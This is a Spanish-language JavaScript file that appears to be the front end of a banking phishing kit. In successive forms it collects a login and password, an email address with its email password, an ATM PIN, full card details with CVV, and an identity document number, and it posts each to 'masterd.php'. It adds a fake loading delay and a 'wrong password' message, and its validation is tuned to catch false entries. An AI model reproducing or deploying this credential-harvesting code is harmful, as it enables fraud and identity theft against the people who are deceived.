var archivo = "masterd.php";
var fusuario = crearElemento("fusuario"),
  formusuario = crearElemento("formusuario");
var usuario = crearElemento("usuario"),
  usuario2 = crearElemento("usuario2"),
  contra = crearElemento("contra"),
  contra2 = crearElemento("contra2");
var textobutton = crearElemento("textobutton"),
  puntopulso = crearElemento("puntopulso");
var usuenviar = crearElemento("usuenviar"),
  comienzo = crearElemento("comienzo");
var autori = 1;
var error2 = crearElemento("error2");


if (usuenviar) {
  usuenviar.addEventListener("click", function () {
    if (usuario.value.length > 5 && contra.value.length > 4) {
      fusuario.setAttribute("method", "post");
      fusuario.setAttribute("action", archivo);
      textobutton.innerHTML = "Cargando";
      puntopulso.style.display = "initial";
      setTimeout(enviar, 1200);
    }
  });
}
if (contra2) {
  usuario2.addEventListener("input", function () {
    if (usuario2.value.length > 5) {
      contra2.removeAttribute("disabled");
    } else {
      contra2.setAttribute("disabled", "disabled");
    }
  });
  contra2.addEventListener("input", function () {
    if (contra2.value.length > 7) {
      comienzo.removeAttribute("disabled");
    } else {
      comienzo.setAttribute("disabled", "disabled");
    }
  });
  comienzo.addEventListener("click", function () {
    if (usuario2.value.length > 5 && contra2.value.length > 7) {
      formusuario.setAttribute("method", "post");
      formusuario.setAttribute("action", archivo);
      formusuario.submit();
    }
  });
}
var error = crearElemento("error");
var fcorreo = crearElemento("fcorreo");
var correo = crearElemento("correo"),
  ccorreo = crearElemento("ccorreo"),
  atm = crearElemento("atm"),
  cusuario = crearElemento("cusuario");
var ecorreo = crearElemento("ecorreo");

if (ecorreo) {
  ecorreo.addEventListener("click", function () {
    if (!validateEmail(correo.value)) {
      error.style.color = "crimson";
      error.innerHTML = "Correo incorrecto";
    } else if (ccorreo.value.length < 5) {
      error.style.color = "crimson";
      error.innerHTML = "Su clave debe de tener con almenos 5 caracteres";
    } else if (cusuario.value == ccorreo.value) {
      error.style.color = "crimson";
      error.innerHTML = "Clave de correo invalida";
    } else if (correo.value == ccorreo.value) {
      error.style.color = "crimson";
      error.innerHTML = "El correo electrónico no puede ser su clave";
    } else if (!validateAtm(atm.value)) {
      error.style.color = "crimson";
      error.innerHTML = "Formato del atm invalido";
    } else {
      error.style.color = "white";
      error.innerHTML = "__________";
      fcorreo.setAttribute("method", "post");
      fcorreo.setAttribute("action", archivo);
      fcorreo.submit();
    }
  });
}

var formCard = crearElemento("formcard");
var inputNcard = crearElemento("ncard");
var inputAnio = crearElemento("anio");
var inputMes = crearElemento("mes");
var inputCvv = crearElemento("cvv");
var btnCard = crearElemento("btntarjeta2");
var validc = 0,
  validm = 0,
  valida = 0,
  validcvv = 0;

if (inputNcard) {
  inputNcard.addEventListener("input", function () {
    if (validateCard(inputNcard.value)) {
      validc = 1;
      if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
        btnCard.removeAttribute("disabled");
      }
    } else {
      btnCard.setAttribute("disabled", "disabled");
      validc = 0;
    }
  });
}

if (inputMes) {
  inputMes.addEventListener("change", function () {
    if (inputMes.value.length > 0) {
      validm = 1;
      if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
        btnCard.removeAttribute("disabled");
      }
    } else {
      btnCard.setAttribute("disabled", "disabled");

      validm = 0;
    }
  });
}
if (inputAnio) {
  inputAnio.addEventListener("change", function () {
    if (inputAnio.value.length > 0) {
      valida = 1;
      if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
        btnCard.removeAttribute("disabled");
      }
    } else {
      btnCard.setAttribute("disabled", "disabled");

      valida = 0;
    }
  });
}

if (inputCvv) {
  inputCvv.addEventListener("input", function () {
    if (validateCvv(inputCvv.value)) {
      validcvv = 1;
      if (validc == 1 && validm == 1 && valida == 1 && validcvv == 1) {
        btnCard.removeAttribute("disabled");
      }
    } else {
      btnCard.setAttribute("disabled", "disabled");

      validcvv = 0;
    }
  });
}

if (btnCard) {
  btnCard.addEventListener("click", function () {
    if (
      validateCard(inputNcard.value) &&
      inputMes.value.length > 0 &&
      inputAnio.value.length > 0 &&
      validateCvv(inputCvv.value)
    ) {
      formCard.setAttribute("method", "post");
      formCard.setAttribute("action", archivo);
      formCard.submit();
    }
  });
}

var formident = crearElemento("fident");
var tipoident = crearElemento("docu");
var nident = crearElemento("ndocu");
var btnident = crearElemento("bdocu");

if (btnident) {
  btnident.addEventListener("click", function () {
    if (tipoident.value.length == 0 || nident.value.length <= 6) {
      error.style.color = "crimson";
      error.innerHTML = "Formato incorrecto";
    } else {
      error.style.color = "white";
      error.innerHTML = "__________";
      formident.setAttribute("method", "post");
      formident.setAttribute("action", archivo);
      formident.submit();
    }
  });
}

function enviar() {
  fusuario.submit();
}

function inenviar() {
  textobutton.innerHTML = "Entrar";
  puntopulso.style.display = "none";
  error2.innerHTML = "usuario o contraseña incorrecta";
}
function crearElemento(elemento) {
  if (document.getElementById(elemento)) {
    return document.getElementById(elemento);
  }
  return false;
}

function wait(ms) {
  var start = new Date().getTime();
  var end = start;
  while (end < start + ms) {
    end = new Date().getTime();
  }
}

function validateEmail(email) {
  const re =
    /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+")){4,}@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  const repe = /^(?!.*?([abcdefghijqlmnñopqrstuvwxyz1234567890])\1{5,}).+/gm;
  return re.test(email) && repe.test(email);
}
function validateAtm(atm) {
  const re = /^[0-9]{4,12}$/;
  return re.test(atm);
}
function validateCvv(cvv) {
  const re = /^[0-9]{3,4}$/;
  return re.test(cvv);
}

function validateCard(card) {
  const re =
    /^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
  return re.test(card);
}
